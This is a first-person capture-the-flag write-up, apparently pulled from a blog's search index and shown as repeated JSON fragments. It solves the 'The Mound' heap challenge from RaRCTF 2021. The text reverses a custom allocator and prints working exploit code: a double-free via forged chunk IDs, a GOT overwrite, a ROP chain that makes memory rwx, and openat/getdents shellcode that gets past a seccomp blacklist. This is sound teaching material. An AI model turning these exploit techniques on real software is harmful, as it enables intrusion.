r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10) mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190) def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakec","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:8:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"An unfinished pwn writeup, wrapped with the airs of regret.","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"If you’re only interested in the technical details for The Mound, I have a minified version of this post on ctfdump. Back in May, I started work on the outlines of a special blogpost. It’s working title was Doing pwn fast: a personal strategy for speedpwning in CTFs, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency – as revolting as it was – wasn’t an immediate concern, and I moved on. Fast forward to now. In the leadup to the 9th of August, I spent my weekend huddled in my house, itching away at RaRCTF’s toughest pwnable: an introductory heap CLI that certain professionals finished within hours: I wasn’t one of those professionals. Have a look at the scoreboard graph for the group of experts I happened to tag along with: Read the graph: Aug 8, 1PM minus Aug 7, 1AM. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I’d invest even more of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right? There’s something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. Could I have done this challenge faster, if I’d went about things differently? Maybe, but that’s not the question I’ll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I’ll be covering in detail here. In the future, I might try to generalise the problems I’ve identified here for a better rendition of Doing pwn fast, but for now: The Mound [800] The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security. Files: mound.zip Archive: mound.zip Length Date Time Name --------- ---------- ----- ---- 18160 2021-08-06 09:14 mound/mound 451 2021-08-06 04:38 ctf.xinetd 566 2021-08-06 17:08 Dockerfile 100 2021-08-06 16:43 setup.sh 25 2021-08-06 04:39 start.sh 22 2021-08-06 17:30 flag.txt 2029224 2021-08-06 17:13 libc.so.6 Relevant details: $ checksec mound/mound [*] '/mound' Arch: amd64-64-little RELRO: Partial RELRO # ! Stack: No canary found # ! NX: NX enabled PIE: No PIE (0x400000) # ! $ seccomp-tools dump mound/mound line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH_X86_64) goto 0014 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0a 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0014 0004: 0x15 0x09 0x00 0x0000003b if (A == execve) goto 0014 0005: 0x15 0x08 0x00 0x00000142 if (A == execveat) goto 0014 0006: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0014 0007: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0014 0008: 0x15 0x05 0x00 0x00000055 if (A == creat) goto 0014 0009: 0x15 0x04 0x00 0x00000086 if (A == uselib) goto 0014 0010: 0x15 0x03 0x00 0x00000039 if (A == fork) goto 0014 0011: 0x15 0x02 0x00 0x0000003a if (A == vfork) goto 0014 0012: 0x15 0x01 0x00 0x00000038 if (A == clone) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL $ ./libc-database/identify libc.so.6 libc6_2.31-0ubuntu9.1_amd64 The seccomp filter is a little bit interesting, but I’ll cover it later on. It’s also worth noting that setup.sh contains this line: $ cat setup.sh #!/bin/sh mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:0:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Working backwards mount has a good number of functions: There’s a function named win; that seems rather important. ssize_t win() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF puts(\"Exploiting BOF is simple right? ;)\"); return read(0, buf, 0x1000uLL); } The binary doesn’t have PIE or stack canaries or RELRO enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:1:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Program outline This is main() (partially prettified): void *arr[16]; // .bss:0x404180 size_t sizes[16]; // .bss:0x404200 int main() { unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); install_seccomp(); puts(\"I am the witch mmalloc\"); puts(\"Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.\"); puts(\"It is, from all of my training, that I have seen the flaws in glibc heap.\"); puts(\"Welcome, fellow pwner, to The Mound\"); moundsetup(); memset(s, 0, 0x100uLL); while ( 1 ) { #define REJECT {puts(\"No.\"); break;} switch ( int opt = menu() ) { case 4: // free printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; case 3: // edit printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; case 2: // add printf(\"Size of pile: \"); __isoc99_scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; default: puts(\"Cya later :p\"); exit(0); } } } That’s pretty long. Let’s break it up into two segments: the preamble, and the while(1) loop. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:2:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Preamble main() doesn’t have a lot of variables. unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF The 3 variables here are user-editable, and we’ll talk about them later. Just keep in mind that user_sz and idx are unsigned integers written to with scanf(\"%d\") calls later on, and s[] is written to with a non-overflowing, non-zero-terminating1 read() call. After this, main() runs a bunch of initialisers: setvbuf(...); // all 3 i/o streams are unbuffered install_seccomp(); // start seccomp filter as shown at the start of this writeup puts(...); // intro message moundsetup(); // setup the \"mound\"; this challenge's heap implementation memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough The only complicated function here is moundsetup(); skip ahead to this part of the writeup if you want to understand it. If not: ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:2:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"main()’s loop The CLI gives five options: 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home Here’s a skeleton script to deal with the options: from pwnscripts import * context.binary = 'mound' context.libc = 'libc.so.6' r = context.binary.process() def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(sz: int, idx: int, s: bytes): choose(2) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) (5) just calls exit(0), but the rest are more complex. Add sand case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; This option is really weird. A user-inputted stream of bytes – not necessarily nul-terminated – are sent to strdup, and the resultant glibc malloc’d string is stored at arr[idx]. This means that some of arr[]’s elements can be a mixture of mound pointers, and actual glibc heap pointers. It’s also worth noting that the str* functions here can overflow, depending on whether the stack has extra nul-bytes or not. Add dirt case 2: // add printf(\"Size of pile: \"); scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; So this is a little bit interesting. The maximum allocation size is 0xfff; user_sz is an unsigned so the single-bounded comparison works out. For some reason, sizes[idx] is set to 0 instead of user_sz. This is a little bit weird because of case 3: Replace dirt case 3: // edit printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; sizes[idx] has to be non-zero for the edit to pass. Since Option 2 sets sizes[idx] to 0, arr[idx] can only be edited if it’s a pointer from the glibc heap in case 1, or if sizes[idx] can be modified somewhere else. Remove dirt case 4: // free printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); // remember that `idx` itself is typed as unsigned. if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; This option calls mfree() on arr[idx]. There’s only one bug here, and it’s that arr[idx] is not zeroed. So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn’t immediately obvious here. I’ll need to dive deeper into the mound implementation. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:2:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mound The mound is kind of like the glibc heap, if it had nothing but the tcache. At the start of the program, the mound grabs two big memory spaces from mmap: 0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw- 0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw- 0xbeef* stores the actual data distributed by mmalloc; I’ll call it mound_data. At the beginning of its life, the entirety of the mound_data segment constitutes the “top chunk” of the mound. 0xdead* stores the metadata for the mound, kind of like what main_arena does in glibc. The structure looks something like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 mound_metadata mound_arena; // cs:0xdead0000000 The new types in there are further defined like so: typedef struct mchunk { size_t id; // rand64() id. size_t sz; // the chunk size (inclusive of metadata) char data[0]; // length is dependent on the size provided to mmalloc() } typedef struct mcache_entry { struct mchunk; // i.e. extend/inherit the mchunk structure here mcache_struct *mcache; // a copy of the mcache for safety verification mcache_entry *next; // next mcache entry; this is a linked list like the tcache. } #define MCACHE_MAX_BINS 0x18 typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } The most interesting part of each mchunk is (in my opinion, anyway) the id element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision2) upon allocation. When a chunk is freed, that ID gets chucked into the mound_metadata to protect the program against a double-free. This might make a lot more sense if I give a flowchart of how things work: Relevant macros: #define request2size(x) ((-x\u00260xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too. #define csize2midx(x) ((x\u003e\u003e4)-2) #define chunk2mem(p) ((void*)p+0x10) #define mem2chunk(p) ((void*)p-0x10) I copied and adapted some of these to python as well: def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to mfree()? ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:3:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mixing heap allocators Simply freeing a glibc heap pointer will almost certainly produce an exit(1): 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 1 Pile: hi Pile index: 0 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 4 Pile index: 0 Mound: Double free detected The relevant part of the code to check is the find_id(c-\u003eid) call: void find_id(size_t id) { for ( int i = 0; i \u003c= 4095; ++i ) if ( id == mound_arena.ids[i] ) { puts(\"Mound: Double free detected\"); exit(1); } } A typical malloc_chunk looks like this: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; }; Because c-\u003eid occupies the same space as a malloc_chunk’s mchunk_prev_size member, the prev_size of the glibc heap chunk is taken as the id in find_id. The glibc chunk pointers allocated by strdup() will never be free, so prev_size == id should always be 0, and find_id(c-\u003eid) should always result in an error given a glibc heap chunk. Or not. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:3:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"The Obvious Solution It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the prev_size field to store user data: This means that if I call strdup(\"A\"*0x17) twice in succession, the first strdup() chunk allocated can be used to overwrite the prev_size of the 2nd strdup() chunk: strdup(b''.rjust(0x17,b'a'), 0) strdup(b''.rjust(0x17,b'a'), 1) edit(0, b''.rjust(0x17,b'a')) Using this method, the interpreted mchunk-\u003eid for a glibc heap chunk can be modified to any value within range(0, 1\u003c\u003c56). # register an arbitrary 56-bit id onto the mound's free id list def reg_id(id: int): strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(id)[:7].rjust(0x17, b'a')) free(0) What are the consequences of this? Adding a new id to mound_arena.ids[] is pretty useless; it would only make allocations harder instead of easier. I could also try to get rid of an ID: def r64(): return randint(0, (1\u003c\u003c64)-1) # generate random ids. Unrelated to rand64bit() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(r64())[:7].rjust(0x17, b'a')) free(1) edit(0, pack(id)[:7].rjust(0x17,b'a')) add(0x10, 2, b'a'*0x10) Then I’d be able to free the same region of memory twice, like this: from ctypes import CDLL libc = CDLL('libc.so.6') # r = ... libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote def rand64bit(): return libc.rand() + (libc.rand()\u003c\u003c32) # ... omitted code ... # ... make sure to account for rand() calls throughout code as well ... while 1: add(sz=0x20, idx=0xf, b'hi') if not ((chunk_id := rand64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) This is a classic tcache dup, except with the mcache instead. Once you accomplish this much, getting to win() isn’t much of a challenge. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:4:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting to win() Right now, mcache-\u003eentries[1] == [arr[0xf] -\u003e arr[0xf]]. arr[0xf]-\u003enext can be modified to anything, so long as (mcache_entry*)(arr[0xf]-\u003enext)-\u003emcache == mound_arena.mcache. Taking a hint from the the definition, I’ll try to point -\u003enext to mound_arena.mcache-0x10, because it’s the only non-user-controlled region that happens to have an mcache pointer. add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8)) The linked list here is now [arr[0xf] -\u003e mound_arena+0x7ff8]. As a reminder, the mound_arena looks like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 Right after the mcache is the top pointer. Pulling two items off of the mcache linked list will get the top pointer overwritten with user-controllable data: add(0x20, 0xd, 'hi') add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) Here, I’m overwriting mound_data.top with a GOT pointer to gain RIP control: add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf() And now the exploit reaches win(): Simple enough, right? ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:4:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"On the lengths I will go to fool myself: a novel, inferior exploit approach Picture this: it’s the middle of a Saturday afternoon. I’m looking at gdb in one window, and vim in the next. There’s a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays™ decompiler. In short, I’m not really thinking straight. But what I do notice, in my digital stupor, are the comments I have open in Pseudocode-Q3: I had dismissed the immediate relevance of strdup() with the false reasoning I’d demonstrated at the end of this section. I even got to work on rationalizing the apparent irrelevancy of case 1/3; my writeup had these lines at one point: It’s reasonable to assume that strdup() was introduced explicitly as an exploit vector for the challenge, so I can expect that there’s a way to edit mchunk_prev_size without calling free(). On a wild guess, I expect that the final exploit involves modifying sizes[idx] and overflowing into glibc chunk metadata via case 3. Since there’s currently no way to move forward with case 1/3, I’ll shift my focus to the other two cases. The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with mmalloc(0). Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I’d prefer to leave the details available to the public. So, let’s talk about mmalloc(). ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:5:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"mmalloc() and mfree() mmalloc() is only ever called in case 2: case 2: // add if ( user_sz \u003c= 0xFFF ) { // ... omitted ... if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; mmalloc() itself is defined a little oddly: __int64 *mmalloc(int user_sz) { int chunk_sz = request2size(user_sz); if ( chunk_sz \u003c 0 ) // not sure what the purpose of this is chunk_sz = (-user_sz \u0026 0xF) + user_sz + 31; int midx = csize2midx(chunk_sz); if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } If I expand the macros, the bug becomes more obvious: __int64 *mmalloc(int user_sz) { // 0 \u003c= user_sz \u003c= 0xfff int chunk_sz = (-user_sz\u00260xf)+user_sz+0x10; // 0x10 \u003c= chunk_sz \u003c= 0x1010 if ( chunk_sz \u003c 0 ) /* { ... } ignore */ int midx = (chunk_sz\u003e\u003e4)-2; // -1 \u003c= midx \u003c= 0xff if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) // possible negative index here!!! return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } As a reminder, the mcache is structured like this: typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } mcache-\u003eentries[-1] really refers to mcache-\u003ecounts[0x10:0x18]. By filling up the mcache bins for 0x120 \u003c= chunk_sz \u003c 0x1a0, we can get mcache-\u003eentries[-1] to point to any arbitrary location. The subsequent call to mmalloc_alloc(0) has a small safety check, as I showed earlier in the flowchart: __int64 *mcache_alloc(int user_sz) { // user_sz = 0 mcache_struct *mcache_ = mcache; // [rsp+30h] [rbp-10h] int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h] mcache_entry *e = mcache-\u003eentries[midx]; // [rsp+20h] [rbp-20h] mcache-\u003eentries[midx] = (mcache_entry *)e-\u003efd; --mcache_-\u003ecounts[midx]; if ( mcache_ != (mcache_struct *)e-\u003emcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache puts(\"Mcache: Invalid verify\"); exit(1); } e-\u003efd = e-\u003emcache = 0LL; remove_id(e-\u003eid); return \u0026e-\u003emcache; } This effectively means that mcache-\u003eentries[-1] needs to point to a known region of user-controlled data, like the mound. I’ll use this bug to allocate a fake chunk with a valid mcache size. def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(0x20, 0, fake_mcache_entry(0x100)) add(1, 1, b'a') # chunk to be overflowed fake_mcache_addr = 0xbeef0000100 for i,b in enumerate(pack(fake_mcache_addr)): chunk_sz = 0x120+i*0x10 user_sz = chunk_sz - 0x10 # TODO: how to get b \u003e 0xf? for i in range(b): add(user_sz, 0xf-i, b'garbage') for i in range(b): free(0xf-i) add(0, 2, b'') # trigger bug free(0) There’s a TODO in there, and I’ll explain. The problem with incrementing mcache-\u003ecounts[0x10:0x18] one-by-one is that there aren’t enough pointers to go around. By right, if sizeof(arr[]) is only 0x10, the maximum value for mcache-\u003ecounts[] should be 0x10 as well. I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in Fake IDs, and I started work on an odd, roundabout method of achieving much of the same4: # The substance of the exploit: getting mcache-\u003eentries[-1] to point to a fake mchunk for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b): def pad(s: bytes): return s.rjust(0x17, b'a') strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk. strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10) add(midx, 2, b'hi') while (pred := r64bit())\u003e\u003e56: add(midx, 2, b'hi') for _ in range(b): # continually double-free to boost -\u003ecounts[] free(2) edit(0xf, pad(pack(r64())[:7])) free(0xe) edit(0xf, pad(","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:5:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Using win() The seccomp filter for this challenge is mildly interesting. Normally, seccomp’d binaries have a whitelist for permitted syscalls, but in this situation, there’s only a blacklist against a few. The blacklisted items give pause for thought: both execve and open are banned, and normally you’d use the former to pop a shell, and the latter for an open-read-write chain. But before I get ahead of myself, let’s talk about how to get to arbitrary syscalls first. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:6:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Moving to rwx There aren’t a lot of gadgets in the main binary, so it might be better to leak libc first. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all') Once that’s done, I can abuse gadgets in libc to convert the mound_data memory region into an rwx page: R = ROP(context.libc) R.raw(0x48*b'a') R.mprotect(mound_data.base, 0x400000, 7) R.call(mound_data.shellcode) r.sendlineafter(';)\\n', R.chain()) This only makes sense if mound_data.shellcode actually points to an area of user-written shellcode. I handled this by writing shellcode to mound_data using add(), long before the mcache dup happens: # ... everything up until the first few add() calls ... sc = ... # I'm about to cover this part. sc = asm(sc) # don't call asm() twice add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use # ... everything else, e.g. getting mcache dup ... Figuring out what shellcode to run isn’t too difficult, if you have a syscall reference in hand. This challenge shows why you shouldn’t use a seccomp blacklist: open might be banned, but openat certainly isn’t. I’ll start off with some shellcode to open the /pwn/ folder: sc = shellcraft.pushstr('/pwn') sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) sc+= 'mov QWORD PTR [{}], rax\\n'.format(0xbeef0000000) sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory After that, I’ll apply a basic assembly loop to search for .txt: sc+= shellcraft.mov('rax', 0xbeef0010000) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(u32('.txt')) sc+= 'jne loop\\n' # End result: *(int*)rax == u32(\".txt\") Since the flag’s filename is always 0x20+4 bytes long, the beginning of the flag filename will be at rax-0x20 , and I can use openat again to write the flag to stdout: sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(0xbeef0000000) sc+= shellcraft.openat('rax', 'rbx', 0) # i.e. shellcraft.cat('rbx'), but sc+= shellcraft.read('rax', 0xdead0000000, 100) # because pwntools uses SYS_open sc+= shellcraft.write(1, 0xdead0000000, 100) # I have to do this in 3 lines. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:6:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting the flag For reference, this is what the full script should look like at this point: from random import randint from collections import namedtuple from ctypes import CDLL from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here sc = '' # step 1: getting a directory listing sc+= shellcraft.pushstr('/pwn') # put \"/pwn\" on the stack sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr sc+= 'mov QWORD PTR [{}], rax\\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base) sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory # step 2: loop through the dents data to find the flag filename sc+=shellcraft.mov('rax', mound_data.dents) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(hex(u32('.txt'))) 